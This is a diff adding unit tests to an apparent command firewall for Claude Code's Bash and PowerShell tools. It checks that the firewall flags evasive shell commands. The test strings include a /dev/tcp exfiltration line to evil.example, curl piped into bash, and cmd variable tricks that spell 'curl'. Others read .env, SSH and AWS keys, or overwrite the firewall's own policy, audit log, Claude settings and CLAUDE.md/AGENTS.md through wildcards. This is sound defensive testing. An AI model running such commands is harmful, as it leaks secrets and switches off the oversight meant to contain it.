@@ -171,11 +171,62 @@ class Reading(unittest.TestCase):
             with self.subTest(text=text):
                 self.assertIn(why, read_command(text, "powershell").unreadable or "")
 
+    def test_a_bound_of_the_reader_makes_the_command_unreadable_never_harmless(self):
+        # Past the bound on wrappers the real program would never be looked at.
+        self.assertEqual(kinds("nice " * 8 + "curl https://x.example"), {"network"})
+        for text in ("nice " * 9 + "curl https://x.example", "nice " * 9 + "npm install left-pad",
+                     "nice " * 9 + "bash -c 'curl https://x.example'", "nice " * 9 + "tee .claude/settings.json",
+                     "sudo nice nohup time env stdbuf -oL setsid timeout 60 command curl https://x.example",
+                     "env " * 9 + "cat .env", "nice " * 9 + "env"):
+            for shell in ("bash", "powershell"):
+                with self.subTest(text=text[:50], shell=shell):
+                    self.assertIn("wrappers before the program", read_command(text, shell).unreadable or "")
+                    tool = "Bash" if shell == "bash" else "PowerShell"
+                    for policy in (STARTER, STRICT):  # unreadable is asked about; .env is refused outright
+                        verdict = policy.evaluate(tool, {"command": text})
+                        self.assertIn((verdict.action, verdict.rule), (
+                            ("ask", f"tools.{tool}.command.unreadable"), ("block", "deny_args[0]")))
+
+    def test_a_program_the_shell_expands_is_chosen_when_the_command_runs(self):
+        # zsh, which Claude Code's Bash tool may run, expands =curl to curl's path; cmd expands its variables.
+        for text in ("=curl https://x.example", "nice =curl https://x.example", "a=1 =curl https://x.example",
+                     "zsh -c '=curl https://x.example'", 'cmd /c "set a=cu&& call %a%rl http://x.example"',
+                     'cmd /c "%a%rl http://x.example"', 'cmd /c "!a!rl http://x.example"',
+                     'cmd /c "%a:~0,2%rl http://x.example"', 'cmd /c "%comspec% /c curl http://x.example"'):
+            with self.subTest(text=text):
+                self.assertIn("chosen when the command runs", read_command(text).unreadable or "")
+        self.assertIn("chosen when the command runs",
+                      read_command('cmd /c "set a=cu&& call %a%rl http://x.example"', "powershell").unreadable or "")
+        for text in ("echo =x", "echo 100%", "date +%Y-%m-%d", "git log --pretty=%h", "%1", "! true", "[ -f x ]"):
+            with self.subTest(text=text):
+                self.assertEqual(kinds(text), set())
+
     def test_comments_and_line_continuations(self):
         self.assertEqual(kinds("ls # curl https://x.example"), set())
         self.assertEqual(kinds("echo a#b"), set())
         self.assertEqual(kinds("cu\\\nrl https://x.example"), {"network"})
         self.assertEqual(kinds("ls <# iwr x #>", "powershell"), set())
+        # An escaped blank belongs to the word, so a "#" after it is no comment: both shells run what follows.
+        for text in ("echo a\\ #b; curl https://x.example", "echo a\\\t#b; curl https://x.example"):
+            self.assertEqual(kinds(text), {"network"}, text)
+        for text in ("Write-Output a` #b; Invoke-WebRequest https://x.example", "Write-Output a` #; npm install x",
+                     "Write-Output a` #; Set-Content .claude\\settings.json x",
+                     "Write-Output a` #; powershell -EncodedCommand AAAA", "Write-Output a`\t#; iwr https://x"):
+            with self.subTest(text=text):
+                self.assertTrue(kinds(text, "powershell"), text)
+        # An escaped escape character, then a blank: that "#" does start a comment.
+        self.assertEqual(kinds("echo a\\\\ #b; curl https://x.example"), set())
+        self.assertEqual(kinds("Write-Output a`` #b; iwr https://x.example", "powershell"), set())
+        self.assertEqual(kinds('echo "a " #b; curl https://x.example'), set())
+        # cmd has no comments and no single quotes, and a caret only escapes: its text keeps them as characters.
+        for text in ('cmd /c "echo a #b & curl https://x.example"', 'cmd /c "echo a^ #b & curl https://x.example"',
+                     "cmd /c \"echo ' & curl https://x.example & echo '\"",
+                     "cmd /c \"for /f %a in ('curl https://x.example') do echo %a\""):
+            for shell in ("bash", "powershell"):
+                with self.subTest(text=text, shell=shell):
+                    self.assertEqual(kinds(text, shell), {"network"})
+        self.assertEqual(kinds("cmd /c \"echo it's here & dir\""), set())
+        self.assertEqual(kinds("cmd /c echo a #b & curl https://x.example"), set(), "here Bash reads the comment")
 
     def test_evidence_is_printable(self):
         reading = read_command("curl\u202e https://x.example; cat '.env\u200b'")
@@ -1167,10 +1218,20 @@ class OperatorCommands(IsolatedHomeTest):
 class RealHookProcess(IsolatedHomeTest):
     """The claude-code template in the hook as Claude Code runs it: a new process per event."""
 
-    def run_hook(self, policy, tool, tool_input, mode="default"):
-        event = {"session_id": "s1", "hook_event_name": "PreToolUse", "tool_name": tool, "tool_input": tool_input,
+    def run_hook(self, policy, tool, tool_input, mode="default", session="s1"):
+        event = {"session_id": session, "hook_event_name": "PreToolUse", "tool_name": tool, "tool_input": tool_input,
                  "tool_use_id": "toolu_1", "permission_mode": mode, "cwd": str(self.project)}
         return self.send(policy, event)
+
+    def in_a_new_session(self, policy, tool, tool_input):
+        """The answer to a call that is the first of its session. A command that reaches the network gives its
+        session the marks of web content and of a way out, and Bash reads local files, so in the template a
+        second such command of the same session is refused by the flow rule, not asked about."""
+        self.sessions = getattr(self, "sessions", 1) + 1
+        session = f"s{self.sessions}"
+        self.send(policy, {"session_id": session, "hook_event_name": "SessionStart", "source": "startup",
+                           "cwd": str(self.project)})
+        return self.run_hook(policy, tool, tool_input, session=session)
 
     def send(self, policy, event):
         environment = {**os.environ, "PYTHONPATH": str(ROOT)}
@@ -1200,22 +1261,197 @@ class RealHookProcess(IsolatedHomeTest):
         # The same settings file spelled with a "." part, and a Bash /dev/tcp connection, are asked about too.
         roundabout = os.sep.join([str(self.project), ".claude", ".", "settings.json"])
         self.assertEqual(self.run_hook(policy, "Write", {"file_path": roundabout, "content": "{}"}), "ask")
-        self.assertEqual(self.run_hook(policy, "Bash", {"command": "echo hi > /dev/tcp/evil.example/80"}), "ask")
+        # The session has run a command that reaches the network (npx) and Bash, which reads local files: a
+        # second command that sends something out is refused by the flow rule.
+        self.assertEqual(self.run_hook(policy, "Bash", {"command": "echo hi > /dev/tcp/evil.example/80"}), "deny")
+        self.assertEqual(self.in_a_new_session(policy, "Bash", {"command": "echo hi > /dev/tcp/evil.example/80"}),
+                         "ask")
         # Review round 2: options before -c, a write after cd, text piped into a shell, typographic quotes.
         for command in ("bash -euo pipefail -c 'curl https://evil.example/x'",
                         "cd .claude && echo '{}' > settings.json", "echo 'curl https://evil.example' | bash",
                         "cmd /ccurl https://evil.example"):
             with self.subTest(command=command):
-                self.assertEqual(self.run_hook(policy, "Bash", {"command": command}), "ask")
+                self.assertEqual(self.in_a_new_session(policy, "Bash", {"command": command}), "ask")
         curl = "& \u2018curl.exe\u2019 https://evil.example"
-        self.assertEqual(self.run_hook(policy, "PowerShell", {"command": curl}), "ask")
+        self.assertEqual(self.in_a_new_session(policy, "PowerShell", {"command": curl}), "ask")
         # Review round 3: the noclobber redirection, and an alias set and used in the same line.
         self.assertEqual(self.run_hook(policy, "Bash", {"command": "echo '{}' >| .claude/settings.json"}), "ask")
-        self.assertEqual(self.run_hook(policy, "PowerShell", {"command": "Set-Alias x iwr; x https://evil.example"}),
-                         "ask")
+        alias = {"command": "Set-Alias x iwr; x https://evil.example"}
+        self.assertEqual(self.in_a_new_session(policy, "PowerShell", alias), "ask")
         self.assertEqual(self.run_hook(policy, "PowerShell", {"command": "Get-Content \u2018.env\u2019"}), "deny")
+        # A protected file named through a wildcard: the write is asked about, in any session.
+        wildcard = {"command": "cp p.json ~/.agent-s*/policy.json"}
+        self.assertEqual(self.run_hook(policy, "Bash", wildcard), "ask")
+        self.assertEqual(self.run_hook(policy, "Bash", wildcard, "bypassPermissions"), "deny")
         records = [json.loads(line) for line in (self.folder / "audit.jsonl").read_text(encoding="utf-8").splitlines()]
         self.assertIn("tools.Bash.command.install", [record.get("rule") for record in records])
+
+
+class NamesTheShellExpands(unittest.TestCase):
+    """A protected file named without being spelled: through a wildcard, a brace list, a variable, a command's
+    output or a name put together when the command runs. The reader cannot tell where such a word lands, so it
+    takes the protected class (one such copy over agent-sentinel's own policy would switch the firewall off)."""
+
+    WRITES = (
+        ("cp /tmp/p.json ~/.agent-s*/policy.json", "bash"),
+        ("echo x > ~/.agent-sentine?/policy.json", "bash"),
+        ("echo x > ~/.agent-[s]entinel/policy.json", "bash"),
+        ("d=sentinel; echo x > ~/.agent-$d/policy.json", "bash"),
+        ("echo x > ~/.agent-${d}/policy.json", "bash"),
+        ("echo x > ~/{.agent-sen,x}tinel/policy.json", "bash"),
+        ("echo x > {~/.agent-sen,x}tinel/policy.json", "bash"),
+        ("echo x > ~/.agent-$(echo sen)tinel/policy.json", "bash"),
+        ("echo x > ~/$p-sentinel/policy.json", "bash"),
+        ("echo x > ~/${d}aude/settings.json", "bash"),
+        ("rm -rf ~/.agent-s*/hook-state", "bash"),
+        ("rm -f ~/.agent-s*/audit.jsonl", "bash"),
+        ("mv x ~/.agent-s*/pins.json", "bash"),
+        ("ln -sf /tmp/p.json ~/.agent-s*/policy.json", "bash"),
+        ("tee ~/.agent-s*/policy.json < /tmp/p.json", "bash"),
+        ("sed -i 's/block/allow/' ~/.agent-s*/policy.json", "bash"),
+        ("echo '{}' > .cl*/settings.json", "bash"),
+        ("echo '{}' > ~/.cl*/settings.json", "bash"),
+        ("cp /tmp/s.json .cl*de/settings.local.json", "bash"),
+        ("echo x >> .mcp.j*", "bash"),
+        ("rsync -a x --exclude=y ~/.cl*/", "bash"),
+        ("cd ~/.agent-$d && echo x > policy.json", "bash"),
+        ("bash -c 'cp x ~/.agent-s*/policy.json'", "bash"),
+        ("find ~ -maxdepth 2 -name policy.json -exec cp /tmp/p.json {} +", "bash"),
+        ("find ~ -maxdepth 2 -name 'pol*' -exec cp /tmp/p.json {} +", "bash"),
+        ("find ~ -name audit.jsonl -delete", "bash"),
+        ("find . -type f -exec sh -c 'cp /tmp/p.json \"$1\"' _ {} \\;", "bash"),
+        ("find ~ -maxdepth 2 -name policy.json | xargs -I{} cp /tmp/p.json {}", "bash"),
+        ("ls -d ~/.agent-s*/policy.json | xargs -I{} cp /tmp/p.json {}", "bash"),
+        (r'cmd /c "echo x > .claude\settings.json"', "bash"),
+        (r'cmd /c "copy p.json %USERPROFILE%\.agent-sen%E%tinel\policy.json"', "bash"),
+        (r'cmd /c "del %USERPROFILE%\.agent-s*\audit.jsonl"', "bash"),
+        (r"Set-Content -Path $HOME\.agent-sen*\policy.json -Value x", "powershell"),
+        (r"Set-Content -Path (Join-Path $HOME ('.agent-' + 'sentinel') 'policy.json') -Value x", "powershell"),
+        (r"Remove-Item -Recurse $HOME\.agent-sen*\hook-state", "powershell"),
+        (r"Set-Content .cl*\settings.json '{}'", "powershell"),
+        (r"Set-Content '.cl*\settings.json' '{}'", "powershell"),
+        (r"Copy-Item C:\tmp\p.json (Resolve-Path ~\.agent-s*\policy.json)", "powershell"),
+        (r"Set-Content $HOME\*sentinel\policy.json x", "powershell"),
+        (r"Set-Content $HOME\?agent-sentinel\policy.json x", "powershell"),
+        (r"""Set-Content "$HOME\.agent-$('sen')tinel\policy.json" x""", "powershell"),
+        (r"Set-Content ('{0}\.agent-{1}\policy.json' -f $HOME,'sentinel') x", "powershell"),
+        (r"'x' > $HOME\.agent-s*\policy.json", "powershell"),
+        (r"'x' | Out-File ($HOME + '\.agent-' + 'sentinel\policy.json')", "powershell"),
+        (r"""[IO.File]::WriteAllText("$HOME\.agent-s$x\policy.json", 'x')""", "powershell"),
+        ("Remove-Item -Recurse ?claude", "powershell"),
+    )
+    READS = (
+        ("cat ~/.agent-s*/policy.json", "bash"),
+        ("cat ~/.agent-s*/audit.key", "bash"),
+        ("cat .e*", "bash"),
+        ("cat ~/.ss?/config", "bash"),
+        ("head -c 100 ~/.a{ws,x}/cred", "bash"),
+        ("cat ~/.$x/key", "bash"),
+        (r"Get-Content $HOME\.agent-s*\audit.key", "powershell"),
+        (r"Get-Content $HOME\?ssh\key", "powershell"),
+        (r"Get-Content ($HOME + '\.agent-' + 'sentinel\audit.key')", "powershell"),
+    )
+    ORDINARY = (
+        ("ls *.py", "bash"), ("rm build/*.o", "bash"), ("cp src/*.txt out/", "bash"), ("rm -rf node_modules/.cache/*", "bash"),
+        ("sed -i 's/.*foo//' file.txt", "bash"), ('sed -i "s/.*foo//" file.txt', "bash"), ("grep -r '.*x' src", "bash"),
+        ('grep -rn "\\.[ch]$" src', "bash"), ("echo 'a.*b' > notes.txt", "bash"), ("echo .\\* > notes.txt", "bash"),
+        ("find . -name '*.pyc' -delete", "bash"), ("find . -name __pycache__ -exec rm -rf {} +", "bash"),
+        ("find . -name '*.py' -exec grep -l foo {} +", "bash"), ("find . -name '*.py' | xargs sed -i 's/a/b/'", "bash"),
+        ("git ls-files | xargs sed -i 's/a/b/'", "bash"), ('for f in *.txt; do mv "$f" "${f%.txt}.md"; done', "bash"),
+        ('rm -rf "$HOME/.cache/$app"', "bash"), ('echo "$x" > "$out"', "bash"), ('jq . in.json > "$name.json"', "bash"),
+        ("cp -r src/. dst/", "bash"), ("tar czf x.tgz --exclude='.git*' src", "bash"), ("date +%Y-%m-%d", "bash"),
+        ("git log --pretty=format:%h%x09%s", "bash"), ("touch {a,b}.txt", "bash"), ("mkdir -p out/{bin,lib}", "bash"),
+        ("cp file{,.bak}", "bash"), ("awk '{print $1}' file > out.txt", "bash"),
+        ("perl -pi -e 's/\\.[^.]*$//' names.txt", "bash"), (r'cmd /c "copy src\a.txt out\a.txt"', "bash"),
+        ("Get-ChildItem -Recurse -Filter *.py", "powershell"), (r"Remove-Item build\*.o", "powershell"),
+        (r"Copy-Item src\*.txt out\ ", "powershell"), ("Remove-Item *.json", "powershell"),
+        ("Get-ChildItem *docker*", "powershell"), ("Set-Content out.txt ($a + $b)", "powershell"),
+        ("Set-Content ($name + '.json') $x", "powershell"),
+        ("(Get-Content f.txt) -replace 'a.*','b' | Set-Content f.txt", "powershell"),
+        (r"Get-ChildItem $env:TEMP\*.log | Remove-Item", "powershell"),
+    )
+
+    def test_a_write_to_a_name_the_shell_may_expand_to_a_protected_one_is_config_write(self):
+        for text, shell in self.WRITES:
+            with self.subTest(text=text):
+                self.assertIn("config_write", kinds(text, shell))
+
+    def test_a_read_of_one_is_a_secret_read_that_hides_its_file(self):
+        for text, shell in self.READS:
+            with self.subTest(text=text):
+                self.assertEqual(kinds(text, shell), {"secret_read", "obfuscation"})
+
+    def test_ordinary_wildcards_variables_and_quoted_patterns_keep_their_class(self):
+        for text, shell in self.ORDINARY:
+            with self.subTest(text=text):
+                self.assertEqual(kinds(text, shell), set())
+        # In Bash a quoted or escaped wildcard is not expanded: the word names a file with that very name.
+        self.assertEqual(kinds("cp x '~/.agent-s*/policy.json'"), set())
+        self.assertEqual(kinds("cp x ~/.agent-s\\*/policy.json"), set())
+        self.assertIn("config_write", kinds("cp x '~/.agent-s'*/policy.json"))
+        # PowerShell's cmdlets expand a quoted wildcard too; and a find's -name is expanded by find itself.
+        self.assertIn("config_write", kinds("Set-Content '.cl*\\settings.json' x", "powershell"))
+        self.assertIn("config_write", kinds("find . -name '*.json' -exec sed -i 's/a/b/' {} +"))
+        self.assertIn("config_write", kinds("find /tmp/build -type f -delete"))
+        self.assertNotIn("config_write", kinds("find . -name '*.json' -exec cat {} +"))
+
+    def test_both_hook_templates_ask_or_refuse_in_every_permission_mode(self):
+        for text, shell in (*self.WRITES, *self.READS):
+            tool = "Bash" if shell == "bash" else "PowerShell"
+            with self.subTest(text=text):
+                self.assertIn(STARTER.evaluate(tool, {"command": text}).action, ("ask", "block"))
+                self.assertEqual(STRICT.evaluate(tool, {"command": text}).action, "block")
+        for text, shell in self.ORDINARY:
+            tool = "Bash" if shell == "bash" else "PowerShell"
+            with self.subTest(text=text):
+                self.assertEqual(STARTER.evaluate(tool, {"command": text}).action, "allow")
+                self.assertEqual(STRICT.evaluate(tool, {"command": text}).action, "allow")
+
+    def test_an_entry_of_a_protected_folder_or_an_instruction_file_named_through_a_wildcard(self):
+        for text, shell in (("cp x .git/hoo*/pre-commit", "bash"), ("echo x > .git/conf?g", "bash"),
+                            ("cp x .vscode/sett*.json", "bash"), ("sed -i 's/a/b/' .vscode/*.json", "bash"),
+                            ("cp x .github/copilot*", "bash"), ("echo x > .git/$f", "bash"),
+                            ("echo x >> CLAUDE.m?", "bash"), ("cp evil.md AGENT?.md", "bash"), ("cp x C*.md", "bash"),
+                            ("mv notes.md MEMORY.m*", "bash"), ("Set-Content CLAUDE.m? x", "powershell"),
+                            (r"Copy-Item x .git\hoo*\pre-commit", "powershell")):
+            with self.subTest(text=text):
+                self.assertIn("config_write", kinds(text, shell))
+        for text, shell in (("sed -i 's/a/b/' *.md", "bash"), ("sed -i 's/a/b/' docs/*.md", "bash"),
+                            ("sed -i 's/a/b/' README*.md", "bash"), ("rm -f *", "bash"),
+                            ("sed -i 's/a/b/' .github/workflows/*.yml", "bash"), ('mv "$f" "${f%.txt}.md"', "bash"),
+                            ('jq . in.json > "$name.json"', "bash"), ("Remove-Item *.md", "powershell")):
+            with self.subTest(text=text):
+                self.assertNotIn("config_write", kinds(text, shell))
+
+    def test_a_variable_that_names_a_protected_folder_counts_as_that_folder(self):
+        for text, shell in (("cp p.json $AGENT_SENTINEL_HOME/policy.json", "bash"),
+                            ('cp p.json "$AGENT_SENTINEL_HOME"/policy.json', "bash"),
+                            ("cp s.json ${CLAUDE_CONFIG_DIR}/settings.json", "bash"),
+                            ('Set-Content "$env:AGENT_SENTINEL_HOME\\policy.json" x', "powershell"),
+                            (r'cmd /c "del /q %AGENT_SENTINEL_HOME%\audit.jsonl"', "bash")):
+            with self.subTest(text=text):
+                self.assertIn("config_write", kinds(text, shell))
+        self.assertEqual(kinds("cat ${AGENT_SENTINEL_HOME}/audit.key"), {"secret_read", "obfuscation"})
+        self.assertEqual(STRICT.evaluate("Bash", {"command": "cp p.json $AGENT_SENTINEL_HOME/policy.json"}).action,
+                         "block")
+        self.assertEqual(kinds("echo $HOME > out.txt"), set())
+
+    def test_a_cmd_text_keeps_its_backslashes_as_path_separators(self):
+        self.assertEqual(kinds(r'cmd /c "type %USERPROFILE%\.ssh\id_rsa"'), {"secret_read"})
+        self.assertEqual(kinds(r'cmd /c "del .claude\settings.local.json"'), {"config_write", "secret_read"})
+        self.assertEqual(kinds(r'cmd /c "dir src\app"'), set())
+
+    def test_hostile_expansions_stay_fast(self):
+        hostile = ["cp x " + "$a" * 4000, "cp x ~/" + "*a" * 4000, "rm ." + "?" * 8000, "cp x " + "{" * 8000,
+                   "cat " + "%a" * 4000, "cp x ~/$a" + "*" * 8000 + "b", "cp x ~/$a" + "?" * 8000 + "b",
+                   "rm " + ".[" * 4000, "cp x " + "a/" * 4000, "cp x ${" * 2000, "find . " + "-name '*' " * 800 + "-delete",
+                   "Set-Content " + "('.ag' + 'x') " * 500, "cat " + "$x.claude/" * 800]
+        for shell in ("bash", "powershell"):
+            for text in hostile:
+                with self.subTest(shell=shell, text=ascii(text[:30])):
+                    start = time.perf_counter()
+                    read_command(text[:MAX_COMMAND_CHARS - 1] + " ", shell)
+                    self.assertLess(time.perf_counter() - start, 1.0)
 
 
 if __name__ == "__main__":
